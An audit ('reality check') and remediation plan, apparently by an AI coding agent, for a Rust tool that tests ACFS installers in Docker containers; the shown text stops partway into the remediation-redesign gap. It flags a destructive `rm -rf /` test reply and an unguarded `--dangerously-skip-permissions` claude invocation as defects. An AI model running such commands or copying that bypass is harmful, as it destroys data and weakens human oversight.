# Reality Check: automated_flywheel_setup_checker (2026-09-01)

Method: read AGENTS.md (at `/data/projects/AGENTS.md`), README.md, CHANGELOG.md, all 39 beads, every file
under `src/`, `tests/`, `scripts/`, `systemd/`, `docker/`, `.github/`; built the release binary; ran
`cargo test --all-features` (385 passed, 6 ignored, 0 failed, 0 warnings); then executed every CLI command
against the real ACFS `checksums.yaml` (48 installers) and against a synthetic checksums file, including real
Docker runs on `afsc-base:latest` and `ubuntu:22.04`, a fake `claude` CLI shim for `--remediate`, a local
webhook receiver for notifications, and a SIGTERM-during-run test. The repo working tree was not modified
except for this file. Host side effects: `afsc-base:latest` image (1.95 GB) now exists; one container
(`afsc-mdwb-20260901-235647-951-a53a`) leaked from the SIGTERM test and was deliberately left running.

Document status: Phase 1 (reality check) and Phase 2 (bridge plan) complete. Phase 3a (bead generation)
not started. This document is the plan of record and is revised in place during ambition and refinement
rounds; do not create parallel plan documents.

## 1. Verdict

The core loop is real and works: download, SHA-256 verify, execute in a fresh Docker container as a non-root
user, capture output, retry transient failures, persist results, expose metrics. That had never been
demonstrated before this session (no test, CI job, or prior run ever executed a real installer through the
Docker path). Around that working core, roughly half of the README's promises are either stale, unwired,
unsafe, or broken as shipped, and none of the 39 beads (all closed) covers any of the remaining gaps.

Live finding of immediate value: `validate --check-hashes` reports 7 of 48 ACFS installers with drifted
upstream checksums right now (atuin, bv, caam, casr, grok, rust, uv). ACFS's fail-closed installer will refuse
those seven for every user until `checksums.yaml` is regenerated. The tool found this in 20 seconds; nothing
runs it on a schedule anywhere.

## 2. Vision checklist

Status legend: WORKING / PARTIAL / STUB / UNPROVEN / NOT_STARTED / REGRESSED / WRONG_APPROACH. Every row
below is also NO_BEAD (zero open beads exist).

| # | Goal (README) | Status | Evidence |
|---|---------------|--------|----------|
| 1 | Each installer runs in a fresh isolated Docker container (README L27) | WORKING, doc drift | zoxide, dcg, uv, srps ran in `afsc-base` containers; containers created and removed. README and `config/default.toml:11` say `ubuntu:22.04`; code default is `afsc-base:latest` (`src/config/schema.rs:79`). Under `ubuntu:22.04` the container runs as root and srps fails with "Don't run this script as root" (false failure); zoxide takes 26 s instead of 0.7 s due to per-run apt. |
| 2 | SHA-256 verification before execution | WORKING | Docker script downloads, `sha256sum`, exits 99 on mismatch (`src/runner/executor.rs:102-127`). uv correctly refused with CHECKSUM_MISMATCH. Semantics gap: any failed installer reports checksum unknown (`sha256_verified:false`, `checksum_result:null`) even when it matched (`executor.rs:186-192`). |
| 3 | Automatic error classification of failures | PARTIAL | `classify-error` CLI works. But `TestResult.error` is never populated by either backend; every persisted result, JSONL line, and notification shows `error_classification: null` / category "unknown". Classification is only used transiently for retry decisions (`executor.rs:665-681`). README says 6 categories; classifier has 10 (`src/parser/classifier.rs`). |
| 4 | Parallel execution with N workers | WORKING (CLI only) | `--parallel 2` ran two containers concurrently. `[execution].parallel` in config is never read (`src/main.rs:404-408` uses CLI value only). |
| 5 | Retry with exponential backoff for transient failures | PARTIAL | Observed 3 attempts with 2.2 s / 4.3 s backoff. But `run_test_with_retry` replaces the result each attempt (`executor.rs:641-643`), so persisted `retry_count` is 0 and `retries` is empty. `[execution].retry_transient` ignored; count hardcoded to 3 (`src/runner/installer.rs:172`). |
| 6 | Claude auto-remediation with safety checks (README L383, L403) | WRONG_APPROACH | Invokes `claude --print --dangerously-skip-permissions --output-format json -p …` with cwd = ACFS repo (`src/remediation/claude.rs:466-477`). `is_command_safe` is never called anywhere outside tests. Reports "Remediation succeeded (ClaudeAuto)" whenever claude exits 0, even when the reply contained `rm -rf /`. Cost estimated from character count ($0.0008) while the JSON envelope said `total_cost_usd: 0.4321` (`claude.rs:537-543`). `parse_changes` expects a `suggestions` key that the claude CLI never emits, so `changes_made` is always empty. `verify_remediation`/`remediate_and_verify` unreachable from CLI. `[remediation]` config ignored; `RemConfig` hardcoded in `main.rs:485-491`. |
| 7 | JSONL/JSON structured output for CI pipelines | PARTIAL (broken on failure) | `tracing_subscriber::fmt::layer()` writes to stdout (`src/logging.rs:16`); any WARN (every failed installer) prefixes stdout with an ANSI log line, so `--format json` and `--format jsonl` are unparseable on exactly the runs that matter. `validate --format json` emits multiple JSON documents. |
| 8 | Result persistence and `status` | WORKING, two bugs | Results file name is second-resolution (`src/reporting/jsonl.rs:376-379`); two runs in the same second clobber each other (observed: the remediation run's results were lost). stdout is not persisted, so the srps root-refusal message (printed to stdout) is invisible in `status --detailed`. |
| 9 | Monitoring server `/health` and `/metrics` | WORKING | 200 with JSON and Prometheus text; 404 on unknown path; clean SIGTERM shutdown. |
| 10 | `status --format prometheus` | WORKING | Correct gauges; ordering nondeterministic (HashMap). |
| 11 | Systemd watchdog integration | Code WORKING, units BROKEN | `SystemdWatchdog` works. Shipped units run `check --all --json --watchdog` and `check --all --json --priority emergency`; clap rejects `--all` immediately. Unit hard-codes `Environment=NOTIFY_SOCKET=/run/flywheel-checker/notify.sock` (READY/STOPPING fail with ENOENT). `ProtectHome=read-only` blocks the tool's only data dir (`~/.local/share/afsc`). `WorkingDirectory` is the ACFS repo. `notify-flywheel-failure.sh` greps `^slack_webhook` and `^notification_enabled`, keys that do not exist in the config, so it always exits "disabled" (and would treat the env var name as a URL). Never installed on any host. |
| 12 | Scheduled regression check via systemd timer | NOT_STARTED (as shipped) | Timer is fine; the service it starts cannot parse its own command line. No CI schedule either (74o.15 asked for one). |
| 13 | Checksum validation: format, URLs, hashes | WORKING | 48/48 URLs reachable; 41 matched, 7 drifted. `validate_checksums(.., true)` sync branch is dead code with a misleading warning (`src/checksums/validator.rs:59-62`). |
| 14 | Configuration file honored | PARTIAL | `main.rs` reads only `general.acfs_repo`, `docker.{image,memory_limit,cpu_quota,pull_policy}`, `notifications.*`, `monitoring.*`, `watchdog.*`. Dead keys: `general.log_level`, `docker.timeout_seconds`, all of `[execution]`, all of `[remediation]`. A partial section (e.g. `[docker]` with only `timeout_seconds`) fails with "missing field `image`" because only the root struct has `#[serde(default)]`. |
| 15 | Slack and GitHub notifications | WORKING (Slack proven) | Slack payload received by a local receiver on failure and success. GitHub path is real code but was not live-tested. Failure category in the message is always "unknown" (see #3). |
| 16 | `list` with `--enabled-only` / `--tag` | WORKING but vestigial | ACFS format has no `enabled` or `tags`; README's `list --tag essential` returns 0. |
| 17 | README accuracy | STALE | "41 installers" (48 today), "366 tests" (391), default image, category count, `--tag` example, remediation safety claim, "Docker daemon not running" troubleshooting (actual message is "Failed to build afsc-base image"), CHANGELOG last entry 2026-01-27 with 40+ commits since. |
| 18 | CI green, installable | REGRESSED | CI on main red since 2026-05-04: Security Audit finds 8 RustSec advisories (bytes, quinn-proto x2, rustls-webpki x4, time; plus anyhow/rand/number_prefix warnings), all transitive; `cargo update --dry-run` shows fixes available. No tags/releases. Nightly is required only because `.cargo/config.toml` passes `-Z threads=4`. `cargo install --git` untested. |
| 19 | Test suite proves the product | NOT_STARTED (test theater) | 16 of 18 bash E2E scripts never invoke the checker with a real command; they write fixtures and assert on the text they wrote (`single_installer.sh`, `checksum_mismatch.sh`, `parallel_execution.sh`, `systemd_integration.sh`, `remediation_flow.sh`, …). `helpers.sh:99-122` still emits the pre-harmonization checksums format. `real_installer_run.sh` only does `--dry-run` (bead 74o.8 required real installs and `checksum_result.matches` assertions). Rust Docker tests are `#[ignore]` + env-gated and run in CI with `continue-on-error: true`. CI smoke `check --dry-run --local` uses `--config /dev/null`, so on GitHub it fails on the missing ACFS path and is hidden by `|| true`. No test anywhere executes a real installer through the Docker path. |
| 20 | Fidelity to how ACFS actually runs installers | PARTIAL, UNPROVEN | ACFS runs `bash|sh <staged-file> <args>` as the target user (`scripts/lib/security.sh:1721-1780`): `sh` for zoxide, atuin, uv, rust, ohmyzsh; args `--unattended --keep-zshrc` (ohmyzsh), `latest` (claude), `-y` (rust); env `ATUIN_NO_MODIFY_PATH=1`. This tool always uses `bash -s --` via stdin and passes args only for rust (`executor.rs:130-135`). ohmyzsh, claude, atuin behavior under this tool is unknown; a 48-installer run has never been done. |
| 21 | Robust container lifecycle | PARTIAL | Timeout and normal paths clean up. SIGTERM (what `systemctl stop` sends) kills the process before `ContainerGuard::drop` runs; container `afsc-mdwb-…` leaked and the installer kept running inside it. No orphan reaper. |
| 22 | Docker-unreachable UX | PARTIAL | With no daemon the error is "Failed to build afsc-base image: DEPRECATED: The legacy builder…", not the documented message. |

## 3. Answers to the five questions

1. Working now: items 1, 2, 4, 9, 10, 13, 15 above, plus the retry mechanism, `classify-error`, `config`, `list`, `status`, the watchdog code, and the `afsc-base` Dockerfile.
2. Not working or misleading: shipped systemd units and notify script; remediation safety and success reporting; JSON/JSONL output on failing runs; classification never attached to results; retry bookkeeping; results-file collisions; SIGTERM container leak; dead config keys and partial-section parse failure; shipped default image causing false failures; documentation and CI status; a test suite that proves almost nothing about the product.
3. Blockers: none technical. The blocker is a proof loop that never closed: three beads (74o.7, 74o.8, 74o.15) were closed with a fraction of their spec, README updates were closed by adding one flag, and no environment (CI, systemd, or a developer's shell) has ever run the tool against real installers until today.
4. Implementing all open beads would close nothing: there are zero open beads. The bead graph says 100% done; the product is roughly 55% of its README.
5. Goals with no bead: every row in section 2. The previous reality check (epic y17, 2026-04-06) covered config schema, notifications, metrics, README; it did not look at execution fidelity, remediation safety, output integrity, systemd, or test validity.

## 4. Bridge plan (Phase 2)

**Reality check date:** 2026-09-01
**Gap count:** 14 critical, 14 major, 9 minor (37 gaps)
**Bead coverage:** none. All 39 beads are closed. Completing existing beads closes zero gaps. Every
resolution below needs new beads (Phase 3a).
**Estimated work:** 55 to 65 beads (each implementation bead has a companion test bead), organized in 7
waves. Waves 0 to 2 are small, parallelizable, and unblock everything else; waves 3 and 4 are the proof
and deployment work; wave 5 is the remediation redesign; wave 6 is canary, docs, and release.
**Prioritization rule used:** vision impact first (core loop trust, then proof, then partial completions,
then new capability, then polish), per the reality-check skill.

### 4.1 Target architecture: the spine every gap resolves into

The gaps are symptoms of one structural fact: the CLI in `src/main.rs` bypasses most of the library. Config
sections are parsed and dropped, results are produced without classification, retry state is discarded,
logging shares stdout with data, and remediation shells out with no policy. Fixing gaps one by one without a
spine would leave the same shape. The plan therefore introduces nine invariants; each gap below names which
invariant it serves.

1. **One resolved settings object.** `config::resolve(cli, file, env) -> Settings`. Precedence is defaults,
   then config file, then `AFSC_*` environment variables, then explicitly passed CLI flags (all CLI flags
   become `Option<_>`). Every subsystem reads `Settings`; nothing reads the raw `Config` or `Cli` after
   resolution. `config show --resolved` prints effective values with their source. Why: eight documented
   keys are dead today and users cannot tell which knobs work.
2. **One installer spec.** `InstallerSpec` = checksums.yaml entry + built-in ACFS execution profile
   (interpreter, args, env, timeout) + `[installers.<name>]` overrides from config. `--dry-run` prints the
   fully resolved spec. Why: ACFS runs five installers with `sh` and passes per-tool arguments; the tool
   currently hardcodes one special case (rust) in code and one (mdwb timeout) in `main.rs`.
3. **One executor contract.** Both backends return a `TestResult` whose failure branches always carry
   `error: Some(ErrorClassification)`, a `checksum: Verified | Mismatch | NotChecked` tri-state, a full
   `attempts: Vec<AttemptRecord>` history, and bounded stdout/stderr captures. Retry orchestration lives in
   exactly one function that accumulates rather than replaces.
4. **One container lifecycle owner.** `ContainerManager` is constructed fallibly, labels every container
   (`afsc.managed`, `afsc.run_id`, `afsc.installer`, `afsc.created_at`, `afsc.pid`), honors a
   `CancellationToken` on signals, and reaps orphans it can prove are its own. Images are hash-tagged and
   rebuilt when the Dockerfile changes.
5. **One report, many sinks.** A `RunReport` (run header with settings snapshot, results, summary) is
   produced once and fed to sinks: human printer, JSON printer (one document), JSONL printer (one object per
   line with a `kind` discriminator), result persister (unique file name), metrics, notifier, structured log.
   Sinks never recompute; they render.
6. **Stdout is data, stderr is logs, exit codes are policy.** 0 all passed; 1 installer failures; 2 usage or
   config error; 3 infrastructure error (Docker unreachable, checksums missing); 130/143 interrupted.
   `std::process::exit` is never called from command handlers, so watchdog STOPPING always fires.
7. **Remediation is a mode with a policy, never a bypass.** `off | advisory | propose | apply`. Checksum
   drift is remediated deterministically without any LLM. Claude runs read-only for advisory and inside a
   git worktree with a diff policy for propose; success is only claimed after the installer re-passes through
   the Docker executor.
8. **Proof at four layers.** Unit (library), CLI integration (assert_cmd against `file://` fixtures, no
   Docker, runs on every CI job), Docker integration (real containers, blocking on ubuntu-latest), live canary
   (nightly against real ACFS with a rolling GitHub issue). The bash E2E runner stays as the deployment and
   operator-facing layer and drives the real binary.
9. **Docs derive from truth.** Installer counts, category names, CLI examples, and config keys in README are
   checked by tests; CHANGELOG is generated from git.

### 4.2 Critical gaps (block the core value proposition)

#### Gap C1: Error classification attached to every failed result — PARTIAL → WORKING

**Current state:** `run_test_docker` and `run_test_local` in `src/runner/executor.rs` never set
`TestResult.error`. `classify_error` is called only inside `should_retry_result` (`executor.rs:665-681`).
`ResultEntry.error_classification` is therefore always `null` (`src/reporting/jsonl.rs:407`),
`build_notification_summary` prints "unknown" (`src/main.rs:1086-1087`), `SummaryGenerator` prints
"unknown", and `status --detailed` never shows an `error:` line. The srps root-refusal message is printed on
stdout, which the classifier never sees.
**Target state:** every result with status Failed, TimedOut, or Cancelled carries `Some(ErrorClassification)`
computed from stderr plus the last 4 KB of stdout, with synthetic inputs for checksum mismatch and timeout.
The classifier gains categories `timeout` and a root-refusal pattern mapped to `permission` with the
suggestion "run as a non-root user (default afsc-base image does this)".
**Success criteria:**
- [ ] Unit: each failure exit in both backends yields `error.is_some()`; timeout yields category `timeout`.
- [ ] Unit: classifier maps "Don't run this script as root" and "must not be run as root" to `permission`.
- [ ] CLI (C8): synthetic fixtures produce categories `dependency`, `checksum_mismatch`, `network`,
      `permission`, `timeout` in JSONL `error.category`, in `status --format json`, and in the Slack payload.
- [ ] Human output prints `error: <category> (<severity>, retryable=…)` and the suggestion under each failure.
**Implementation plan:**
1. `executor.rs`: add `fn finalize_failure(result: &mut TestResult, synthetic: Option<&str>)` that sets
   `error` when `None` using `classify_error(&combined_text, exit_code)`; call it at every failure return in
   both backends and in `parallel.rs:63-66` (execution error path).
2. `src/parser/classifier.rs`: add `is_timeout` (matches the executor's synthetic marker), root-refusal
   patterns, and `ErrorSeverity::Transient` for timeout only when the installer profile says so (default no).
3. `main.rs` human printer and `status --detailed`: print category and suggestion.
4. Fixtures: add `tests/unit/fixtures/error_outputs/root_refused.txt` and `timeout.txt`.
**Dependencies:** none. **Complexity:** S. **Vision goals served:** 3, 8, 15.

#### Gap C2: Stdout carries only data — PARTIAL → WORKING

**Current state:** `src/logging.rs:16` installs `fmt::layer()` with the default stdout writer. Every WARN from
a failed installer lands on stdout in ANSI color, so `check --format json|jsonl` is unparseable whenever
something fails. `validate --format json` prints up to three separate JSON documents (format result, URL
result, hash result). Human progress lines and data share stdout.
**Target state:** logs go to stderr (color only when stderr is a TTY); every `--format json` command prints
exactly one JSON document; `--format jsonl` prints one object per line with a `kind` field (`run`, `result`,
`summary`) and nothing else; human mode prints progress to stderr and the final table to stdout;
`--quiet` suppresses progress.
**Success criteria:**
- [ ] CLI: for every command × format, `jq -s length` on stdout equals 1 for json; every line parses for jsonl,
      even with `-vvv` and a failing fixture.
- [ ] CLI: stdout bytes are identical with and without `-vvv`.
- [ ] `RUST_LOG=trace` does not alter stdout.
**Implementation plan:**
1. `logging.rs`: `.with_writer(std::io::stderr)`, `.with_ansi(std::io::stderr().is_terminal())`, optional
   `--log-format json` (shared with M7).
2. `main.rs cmd_validate`: build a single `ValidateReport { format, url_checks: Option, hash_checks: Option }`,
   print once at the end; human mode unchanged.
3. `cmd_check`: JSONL lines gain `"kind"`; emit the run header (settings snapshot) first and the summary last.
4. Add `--quiet` global flag; human progress ("Starting installer test…") goes through tracing INFO on stderr.
**Dependencies:** none. **Complexity:** S. **Vision goals served:** 7, 13.

#### Gap C3: Retry history preserved and retry policy configurable — PARTIAL → WORKING

**Current state:** `run_test_with_retry` (`executor.rs:625-648`) assigns `result = self.run_test(test)` on
each attempt, discarding `retries`, `attempt`, and earlier durations; `max_attempts` is set only at the end.
`InstallerTest::retry_count` is hardcoded to 3 (`installer.rs:172`); `[execution].retry_transient` is never
read. `src/runner/retry.rs` (`RetryConfig`, `RetryStrategy`) is dead code duplicating `calculate_backoff`.
**Target state:** `TestResult.attempts: Vec<AttemptRecord { index, started_at, finished_at, exit_code,
status, stderr_tail, waited_before_ms }>`; `attempt` is the final index; `duration_ms` is total wall time;
`last_attempt_ms` is the final attempt; retries come from `Settings.execution.retry_transient` and per-installer
overrides; backoff uses `RetryConfig` (exponential, jitter, cap) from `retry.rs`.
**Success criteria:**
- [ ] Unit: a fixture that fails twice then succeeds (counter file via `AFSC_TEST_COUNTER` env) yields
      `attempts.len() == 3`, `retry_count() == 2`, final status Passed.
- [ ] Unit: `retry_transient = 0` performs one attempt; checksum mismatch and timeout never retry.
- [ ] CLI: JSONL and `status --detailed` show attempts and wait times.
**Implementation plan:**
1. `installer.rs`: add `AttemptRecord`; keep `retries`/`retry_count()` as derived views for compatibility.
2. `executor.rs`: rewrite `run_test_with_retry` to accumulate; delete `calculate_backoff`; use
   `RetryConfig::delay_for_attempt` plus jitter.
3. `main.rs`: build `InstallerTest` with `retry_count` from settings (C5) and overrides (M2).
4. `jsonl.rs ResultEntry`: persist `attempts` (index, exit, waited, stderr_tail).
**Dependencies:** C5 for the setting (can land with a temporary constant). **Complexity:** S.
**Vision goals served:** 5, 8.

#### Gap C4: Unique, complete result files and checksum tri-state — WORKING with bugs → WORKING

**Current state:** `ResultPersister::results_filename` uses `%Y%m%d_%H%M%S` (`jsonl.rs:376-379`); two runs in
the same second overwrite each other (observed). `ResultEntry` lacks stdout, run metadata (backend, image,
user, parallel, timeout, checksums.yaml hash, tool version), attempts, and container info. `sha256_verified`
is `false` for any failed installer because `parse_checksum_result` returns `None` on non-zero exits
(`executor.rs:186-192`). `latest_results` sorts by filename.
**Target state:** file name `results_<YYYYmmddTHHMMSS.mmmZ>_<run_id8>.jsonl`; first line
`{"kind":"run", run_id, started_at, tool_version, git_sha, backend, image, user, parallel, timeout,
acfs_repo, checksums_sha256, config_source}`; result lines carry `stdout_tail`, `stderr_tail` (last 2 KB
each), `attempts`, `checksum: {state: verified|mismatch|not_checked, expected, actual}`, `container_id`,
`image`; last line `{"kind":"summary", …, interrupted: bool}`. `status` selects the newest run by header
timestamp; `status --list` shows recent runs; `status --run <id>` shows one; retention keeps the last
`general.results_retention` runs (default 200) and prunes older result files only (never other files).
**Success criteria:**
- [ ] Unit: two persists in the same millisecond produce two files; `read_results` round-trips all fields.
- [ ] Docker (C9): an installer that verifies then fails shows `checksum.state == "verified"`.
- [ ] CLI: `status --list` after two rapid runs shows both; `status --run <id>` works.
**Implementation plan:**
1. `executor.rs build_verified_install_script`: after the compare, `echo "CHECKSUM_OK $ACTUAL" >&2` before
   `set +e`; `parse_checksum_result` returns `Verified` when the marker is present regardless of exit code.
2. `installer.rs`: `ChecksumResult` becomes an enum `ChecksumState`; local backend maps accordingly.
3. `jsonl.rs`: new file name, run header, richer `ResultEntry`, `list_runs()`, `prune()`.
4. `main.rs cmd_status`: `--list`, `--run`, header-based selection, prints checksum state words.
**Dependencies:** C1, C3. **Complexity:** M. **Vision goals served:** 2, 8.

#### Gap C5: Configuration is real — PARTIAL → WORKING

**Current state:** `main.rs` reads only `general.acfs_repo`, `docker.{image,memory_limit,cpu_quota,
pull_policy}`, `notifications`, `monitoring`, `watchdog`. Dead keys: `general.log_level`,
`docker.timeout_seconds`, `execution.{parallel,retry_transient,fail_fast}`, all of `[remediation]`. CLI
defaults (`--parallel 1`, `--timeout 300`) always win. Only the root `Config` has `#[serde(default)]`, so a
partial section fails with "missing field". `HEAVY_SETUP_TIMEOUT_FLOOR_SECONDS` and the `mdwb` special case
live in `main.rs:170-181`; the base-image build timeout is coupled to `--timeout`.
**Target state:** `config::Settings` produced by `resolve()`, precedence defaults < file < `AFSC_*` env <
CLI flags that were actually passed; `#[serde(default)]` on every struct and field; `config show --resolved`
annotates each value with its source; `config validate` warns on unknown keys; new keys:
`general.data_dir`, `general.results_retention`, `general.log_dir`, `docker.build_timeout_seconds` (900),
`docker.run_as_root` (false), `docker.reap_orphans` (true), `execution.parallel = "auto"` allowed (min(4,
cores/2)), `[installers.<name>]` (M2). `log_level` applies when neither `RUST_LOG` nor `-v` is given.
**Success criteria:**
- [ ] Unit: precedence matrix (file only, env only, CLI only, all three) for every key.
- [ ] Unit: a config containing only `[docker]\ntimeout_seconds = 600` parses; unknown key produces a warning
      and `config validate --strict` exits 2.
- [ ] CLI: config `parallel = 4, fail_fast = true` with no CLI flags runs 4 fixtures concurrently
      (overlapping `started_at`) and marks later ones Skipped/Cancelled after the first failure (with M11).
- [ ] `config show --resolved` output is stable and documented.
**Implementation plan:**
1. `schema.rs`: defaults on all fields; add new fields; `Config::default()` equals `config/default.toml`
   (unit test loads the shipped file and compares).
2. New `src/config/resolve.rs`: `Settings`, `Source` enum, env mapping (`AFSC_EXECUTION_PARALLEL` etc.),
   `unknown_keys()` via a `toml::Table` second pass.
3. `main.rs`: CLI flags become `Option<_>`; `CheckOptions` built from `Settings`; remove hardcoded constants
   (move `mdwb` timeout into the built-in profile table, M1/M2); `RunnerConfig` and remediation config from
   `Settings`.
4. `config/default.toml` and README config block regenerated from `Config::default()` (M12 test guards it).
**Dependencies:** none. **Complexity:** M. **Vision goals served:** 14, 4, 5, 6.

#### Gap C6: One default image, non-root execution on any image — doc drift and false failures → WORKING

**Current state:** schema default `afsc-base:latest`; `config/default.toml:11` and README say
`ubuntu:22.04`. With any image other than the exact string `afsc-base:latest`, `create_container` runs as
root and `run_test_docker` installs prerequisites per container (20 to 30 s, 180 s cap). srps and other
root-refusing installers fail falsely; zoxide took 26 s instead of 0.7 s.
**Target state:** the only documented default is `afsc-base:latest`. For any configured base image, the tool
builds and caches a derived image `afsc-prepared:<base-tag>-<dockerfile-hash>` (prerequisites plus
`afsc-user`) once, and every container runs as `afsc-user` unless `docker.run_as_root = true` (which logs a
WARN and is reported in the run header). Multi-Ubuntu testing becomes `docker.image = "ubuntu:24.04"` with
no other change (closes the README "single Ubuntu version" limitation).
**Success criteria:**
- [ ] Docker: `image = "ubuntu:24.04"` runs srps as non-root and passes; second run has < 3 s image overhead.
- [ ] Unit: `Config::default().docker.image == "afsc-base:latest"` and equals `config/default.toml`.
- [ ] Human and JSON run header show image and user.
**Implementation plan:**
1. `docker/Dockerfile.base` becomes a template with `ARG BASE=ubuntu:22.04`; `container.rs ensure_image`
   → `ensure_prepared_image(base)`.
2. `create_container`: always set `user` and HOME unless `run_as_root`.
3. `executor.rs`: delete the per-container apt path.
4. `config/default.toml`, README: `afsc-base:latest`; document `docker.image` as the base to derive from.
**Dependencies:** C5, M3 (hash-tagging). **Complexity:** M. **Vision goals served:** 1, 20.

#### Gap C7: Signal-safe container lifecycle and orphan reaper — PARTIAL → WORKING

**Current state:** no signal handling in `cmd_check`; `ContainerGuard::drop` (`container.rs:528-549`) never
runs when the process is killed; observed leak `afsc-mdwb-…` with the installer still executing inside;
`ContainerManager::new` panics via `expect` on client construction (`container.rs:70-73`); containers carry
no labels, so orphans cannot be identified safely.
**Target state:** SIGINT/SIGTERM trigger a `CancellationToken`; each worker races its exec against the token,
stops and removes its container (5 s grace), records status `Cancelled`, and the run persists with
`interrupted: true`; exit code 130/143; every container is labeled; startup reaper removes containers with
`afsc.managed=true` whose `afsc.pid` is dead or whose age exceeds `2 × timeout` (config
`docker.reap_orphans`); `check --reap` runs only the reaper; non-afsc containers are never touched;
`ContainerManager::try_new() -> Result`.
**Success criteria:**
- [ ] Docker: SIGTERM 5 s into a slow fixture leaves zero `afsc.managed` containers within 10 s and writes a
      results file whose summary has `interrupted: true`.
- [ ] Docker: a labeled container with a dead pid is reaped; an unlabeled `sleep` container is untouched.
- [ ] Unit: a bad `DOCKER_HOST` yields `Err`, not a panic.
**Implementation plan:**
1. Add `tokio_util::sync::CancellationToken` threaded through `ParallelRunner`, `InstallerTestRunner`, and
   `ContainerManager::exec_in_container` (select on token; on cancel call `cleanup`).
2. `main.rs`: `tokio::signal` handler that cancels the token, waits for workers with a bounded grace, then
   returns `Err(Interrupted)` mapped to exit 130/143.
3. `container.rs`: labels on create; `reap_orphans()`; `try_new`.
4. New subcommand `check --reap` (or `docker reap`); document in README.
**Dependencies:** none (labels also used by M3). **Complexity:** M. **Vision goals served:** 21, 11.

#### Gap C8: CLI integration test suite that drives the binary — NOT_STARTED → WORKING

**Current state:** `tests/e2e/*.rs` are library-level except three invocations (`validate`, `serve --help`,
`config`); no test runs `check` through the binary; `tests/common` fixtures use `checksum: {algorithm,
value}` in places.
**Target state:** `tests/cli/` (assert_cmd + predicates) with a fixture builder that writes the current
checksums format, mock installers served via `file://` (pass, dependency failure, wrong hash, root refusal,
sleep-then-exit for timeouts, flaky-N-times, huge-output), a temp HOME and data dir, and wiremock for HTTP.
Coverage: `check` (human/json/jsonl, parallel, fail-fast, retries, timeout, exit codes, `--quiet`,
`--dry-run` resolved spec), `status` (formats, `--list`, `--run`, `--detailed`), `validate` (format, URLs and
hashes via wiremock, KNOWN_INSTALLERS cross-check), `list`, `classify-error`, `config` (precedence, partial,
unknown keys, `--resolved`), `serve` (ephemeral port, both endpoints, 404, SIGTERM), `--remediate` with the
checked-in fake claude, notifications via wiremock. Each test prints the command line, stdout, and stderr on
failure.
**Success criteria:**
- [ ] At least 60 tests, total runtime under 60 s, run on ubuntu and macOS CI jobs without Docker.
- [ ] Every vision goal except 1, 20, 21 has at least one CLI test named for it.
**Implementation plan:**
1. `tests/cli/support.rs`: `Fixture::builder()`, `run(&[args]) -> Output`, wiremock helpers, fake claude path.
2. One file per command; a `vision_map.rs` table linking tests to vision goal numbers (used by M12).
3. Retire the redundant library-level `tests/e2e/*` cases that these supersede; keep the rest.
**Dependencies:** C1 to C5 (tests assert the new behavior; write them alongside, marked `#[ignore]` until the
feature lands, then un-ignore in the same PR). **Complexity:** L. **Vision goals served:** 19.

#### Gap C9: Docker integration tests run for real — UNPROVEN → WORKING

**Current state:** six trivial `#[ignore]` tests gated on `DOCKER_TESTS`; CI runs them with
`continue-on-error: true` against a dind service the tests do not use (no `DOCKER_HOST`), so they pass
vacuously or fail silently. Bead 74o.7 specified ten tests; four meaningful ones are missing.
**Target state:** `tests/docker/` gated on `AFSC_DOCKER_TESTS=1`, executed in a blocking CI job on
ubuntu-latest host Docker: create/exec/cleanup; timeout kills and removes; memory limit visible via inspect;
env vars; naming and labels; non-root user; real zoxide passes with `checksum.state == verified`; wrong hash
refused with exit 99 and no execution; cancel on signal (C7); prepared-image cache (C6); orphan reaper;
output cap (m9).
**Success criteria:**
- [ ] All Docker tests green in CI with no `continue-on-error`; total under 6 minutes with image cache.
- [ ] Local run instructions in README work (`AFSC_DOCKER_TESTS=1 cargo test --test docker`).
**Implementation plan:**
1. Move and extend `tests/e2e/test_docker_integration.rs` into `tests/docker/`.
2. `.github/workflows/e2e-tests.yml`: drop the dind service, cache `afsc-base` via `docker save` +
   `actions/cache`, remove `continue-on-error`.
**Dependencies:** C6, C7. **Complexity:** M. **Vision goals served:** 19, 1, 21.

#### Gap C10: Real-installer E2E and full-catalog baseline — NOT_STARTED → WORKING

**Current state:** `scripts/e2e/tests/real_installer_run.sh` runs only `--dry-run`; bead 74o.8 (real
installs, checksum assertions, status, list, `--local`, broken URL) was closed without them. No one has ever
run all installers through the tool; behavior of ohmyzsh, claude, atuin under this tool is unknown.
**Target state:** `real_installer_run.sh` implements the 74o.8 specification against Docker; a new
`scripts/full_catalog_run.sh` runs every installer with `--parallel 4 --format jsonl`, renders
`docs/baseline/<date>.md` (installer, status, duration, category, notes) and diffs against the previous
baseline; the first baseline is committed with per-installer notes feeding M1/M2 overrides.
**Success criteria:**
- [ ] `real_installer_run.sh` asserts: zoxide and dcg pass in parallel, JSONL `checksum.state == verified`,
      `status` shows the run, `list --format json` length ≥ 48, `--local zoxide` passes, broken URL exits 1.
- [ ] A committed baseline shows the pass/fail state of all 48 installers with explanations for failures.
**Implementation plan:**
1. Rewrite `real_installer_run.sh` using the helpers (M8) and `jq` assertions.
2. Add `scripts/full_catalog_run.sh` and `docs/baseline/`.
**Dependencies:** C2, C4, C6, C7, M1, M2. **Complexity:** M. **Vision goals served:** 19, 20.

#### Gap C11: Nightly canary workflow — NOT_STARTED → WORKING

**Current state:** no scheduled run anywhere; 74o.15 asked for one; today's 7 drifted checksums were found by
hand.
**Target state:** `.github/workflows/nightly-canary.yml` (cron daily, `workflow_dispatch` with an installer
filter): checkout ACFS main into a sibling path, build the tool (cache), run `validate --check-urls
--check-hashes --format json` and `check --parallel 4 --timeout 600 --format jsonl`, upload both as
artifacts, and a summary job that parses JSON and opens or updates one rolling GitHub issue labeled
`afsc-canary` with a table of drifted checksums and failed installers (comment on change, close when clean).
**Success criteria:**
- [ ] A manual dispatch produces artifacts and the issue; a second clean run closes it.
- [ ] Workflow total under 90 minutes; concurrency guard prevents overlap.
**Implementation plan:** workflow file; `scripts/ci/summarize_canary.py` or a `report` subcommand (prefer
the subcommand `status --format markdown --run <id>` so the logic is tested in Rust).
**Dependencies:** C2, C10, C14. **Complexity:** M. **Vision goals served:** 12, 13.

#### Gap C12: Remediation redesign — WRONG_APPROACH → WORKING (epic, five beads)

**Current state:** `--remediate` runs `claude --print --dangerously-skip-permissions --output-format json -p
<prompt>` with cwd = ACFS repo (`claude.rs:466-477`); reports "succeeded (ClaudeAuto)" on exit 0 regardless
of content; `is_command_safe` never called; cost estimated from characters; `parse_changes` expects a key the
CLI never emits; verification helpers unreachable; `[remediation]` ignored; README promises safety checks.
Verified today with a fake claude: a reply containing `rm -rf /` was reported as a success at $0.0008 while
the envelope said $0.43.
